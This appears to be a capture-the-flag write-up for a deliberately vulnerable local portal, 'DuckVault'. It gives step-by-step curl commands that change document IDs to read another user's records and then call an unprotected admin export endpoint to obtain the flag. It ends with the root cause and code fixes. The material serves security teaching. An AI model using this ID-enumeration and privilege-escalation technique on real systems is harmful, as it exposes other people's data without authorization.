# DuckVault Solution

## Idea

DuckVault is a small internal records portal. The player starts with a normal employee account and needs to understand how the application loads records and uses the API.

The challenge is based on this chain:

```text
IDOR / BOLA -> Data Exposure -> Broken Function Level Authorization -> Flag
```

---

# Solution 1: Web + API Method

## 1. Start the challenge

From the project folder, run:

```bash
docker compose up --build
```

The app will run on:

```text
http://localhost:8000
```

---

## 2. Login

Open:

```text
http://localhost:8000/login
```

Use the provided account:

```text
Username: intern
Password: intern123
```

This is a normal employee account, not an admin account.

---

## 3. Open the normal document

After login, the dashboard shows the document available to the user.

Open:

```text
/documents/1042
```

This document belongs to the `intern` user.

The content mentions that some older records were migrated from a legacy numeric sequence. This is a hint that document IDs may be worth checking.

---

## 4. Try another document ID

Change the document ID in the URL to:

```text
/documents/1044
```

The application returns a restricted document that does not belong to the current user.

This happens because the backend checks if the user is logged in, but it does not check if the document belongs to that user.

This is the IDOR / BOLA part of the challenge.

---

## 5. Find the leaked reference

Inside the restricted document, there is an internal reference:

```text
report_id=7331
```

This value should not be visible to a normal employee.

This is the data exposure part of the chain, because the restricted document leaks a useful internal report ID.

---

## 6. Check the report metadata

Open:

```text
/api/reports/7331
```

This endpoint does not return the flag directly.

It only returns report metadata and says that the full report needs an admin export job.

---

## 7. Use the admin export endpoint

Now send a POST request to:

```text
/api/admin/exports
```

With this JSON body:

```json
{
  "report_id": 7331
}
```

Example using curl after logging in:

```bash
curl -c cookies.txt -X POST http://localhost:8000/login \
  -d "username=intern" \
  -d "password=intern123"

curl -b cookies.txt -X POST http://localhost:8000/api/admin/exports \
  -H "Content-Type: application/json" \
  -d '{"report_id":7331}'
```

The endpoint returns the flag even though the current user is only an employee.

This is the BFLA part, because the export function should be admin-only, but the backend does not check the user role.

---

## Flag

The flag appears in the response from:

```text
POST /api/admin/exports
```

The response includes something like:

```json
{
  "required_role": "admin",
  "current_role": "employee",
  "access_control_status": "missing admin role validation",
  "flag": "DUCK{...}"
}
```

---

# Solution 2: Full Terminal Method

This method solves the whole challenge using only `curl`, without opening the web interface.

## 1. Start the challenge

In the first terminal, run:

```bash
cd ~/Downloads/duckvault_quick
docker compose up --build
```

Keep this terminal open.

---

## 2. Check that the app is running

In a second terminal, run:

```bash
curl http://localhost:8000/health
```

Expected response:

```json
{"status":"ok"}
```

---

## 3. Login and save the session cookie

```bash
curl -i -c cookies.txt -X POST http://localhost:8000/login \
  -d "username=intern" \
  -d "password=intern123"
```

This saves the logged-in session in `cookies.txt`.

---

## 4. Request the assigned document

```bash
curl -b cookies.txt http://localhost:8000/api/documents/1042
```

This returns the normal document owned by the `intern` user.

---

## 5. Request another document ID

```bash
curl -b cookies.txt http://localhost:8000/api/documents/1044
```

This returns a restricted document owned by another user.

Inside the response, the player can find:

```text
report_id=7331
```

---

## 6. Check the report metadata

```bash
curl -b cookies.txt http://localhost:8000/api/reports/7331
```

This returns metadata only. The flag is not returned here.

The response shows that the full report requires an admin export job.

---

## 7. Send the admin export request

```bash
curl -b cookies.txt -X POST http://localhost:8000/api/admin/exports \
  -H "Content-Type: application/json" \
  -d '{"report_id":7331}'
```

This returns the restricted report and the flag.

---

## Full Terminal Commands

```bash
curl http://localhost:8000/health

curl -i -c cookies.txt -X POST http://localhost:8000/login \
  -d "username=intern" \
  -d "password=intern123"

curl -b cookies.txt http://localhost:8000/api/documents/1042

curl -b cookies.txt http://localhost:8000/api/documents/1044

curl -b cookies.txt http://localhost:8000/api/reports/7331

curl -b cookies.txt -X POST http://localhost:8000/api/admin/exports \
  -H "Content-Type: application/json" \
  -d '{"report_id":7331}'
```

---

# Root Cause

The main problem is that the app checks authentication, but does not properly check authorization.

In other words, it checks:

```text
Is the user logged in?
```

But it does not always check:

```text
Is this user allowed to access this document or function?
```

The missing checks are:

- Document ownership check
- Report access check
- Admin role check for export jobs

---

# Fix

To fix the issue, the backend should check ownership before returning documents.

Example:

```sql
SELECT *
FROM documents
WHERE id = ? AND owner_id = ?
```

For the admin export endpoint, the backend should check the role first:

```python
if session.get("role") != "admin":
    return jsonify({"error": "forbidden"}), 403
```

Also, restricted documents should not expose internal report IDs to users who are not allowed to access them.

---

# Final Attack Path

```text
Login as intern
-> Open /documents/1042
-> Change the document ID to /documents/1044
-> Find report_id=7331
-> Check /api/reports/7331
-> Send POST request to /api/admin/exports
-> Get the flag
```